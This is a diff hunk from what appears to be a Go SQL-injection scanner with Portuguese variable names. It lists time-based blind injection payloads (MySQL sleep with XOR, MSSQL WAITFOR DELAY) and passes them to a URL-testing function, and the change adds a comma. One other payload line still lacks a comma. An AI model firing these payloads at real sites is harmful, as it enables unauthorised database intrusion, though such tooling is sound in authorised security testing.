@@ -111,7 +111,7 @@ func main() {
 		"1'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z",
 		"?id=1'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z"
 		"1'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z",
-		"';WAITFOR DELAY '0:0:tempoSQLi'--"
+		"';WAITFOR DELAY '0:0:tempoSQLi'--",
 	}
 
 	testarURLs(tempoSQLi, payloads)
